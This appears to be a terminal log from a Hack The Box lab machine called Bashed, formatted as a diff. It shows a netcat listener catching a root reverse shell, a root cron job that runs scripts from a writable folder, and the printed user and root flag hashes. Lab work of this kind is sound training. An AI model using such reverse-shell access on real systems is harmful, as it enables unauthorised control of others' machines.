@@ -1,0 +1,26 @@
+arjun@broly:~/Documents/HacktheBox/retired/bashed$ vim test.py                  
+arjun@broly:~/Documents/HacktheBox/retired/bashed$ nc -lvnp 1234                
+listening on [any] 1234 ...             
+connect to [10.10.14.24] from (UNKNOWN) [10.10.10.68] 37734                     
+/bin/sh: 0: can't access tty; job control turned off                            
+# id                
+uid=0(root) gid=0(root) groups=0(root)  
+# crontab -l        
+* * * * * cd /scripts; for f in *.py; do python "$f"; done                      
+# cd /root          
+# ls                 
+root.txt            
+# cat root.txt      
+cc4f0afe3a1026d402ba10329674a8e2        
+# su arrexel        
+ls                  
+ls: cannot open directory '.': Permission denied                                
+cd ~                
+
+ls                  
+user.txt            
+cat user.txt        
+2c281f318555dbc1b856957c7147bfc1        
+exit                
+# exit              
+arjun@broly:~/Documents/HacktheBox/retired/bashed$                              
